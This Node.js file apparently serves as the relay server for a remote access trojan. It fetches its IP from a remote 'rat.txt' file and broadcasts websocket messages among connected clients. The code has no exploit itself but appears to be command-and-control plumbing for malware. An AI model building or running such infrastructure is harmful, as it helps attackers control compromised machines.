const axios = require('axios'); //to make get requests
const WSserver = require('websocket').server; //to establish tcp tunnels
const http = require('http'); //to make server

async function main()
{
    let res = await axios.get('https://utilsy.glitch.me/rat.txt'); //make get to file with IP of server
    let IP = res.data; //get only contains of .txt without http header
    //not important here

    const server = http.createServer(); //create http server
    server.listen('2208',()=> //make it run on port 2208
        {
            console.log('listening on port 2208'); //log
            console.log('waiting for incoming connections'); //log
        });

    const wsServer = new WSserver( //create new websocket
        {
            httpServer: server,
        });

    wsServer.on('request',(request)=> //this will run if someone connects
        {
            const conn = request.accept(null,request.origin); //accept request to establish tcp connection
            console.log('Connection established'); //log

            conn.on('close',()=> //log when someone disconnects
                {
                    console.log('Connection closed');
                });
            conn.on('message',(data)=> //when you get message
                {
                    console.log(data.utf8Data); //it displays it here in console
                    wsServer.broadcast(data.utf8Data); //and sends it to everyone that is connected
                });
        });
}
main();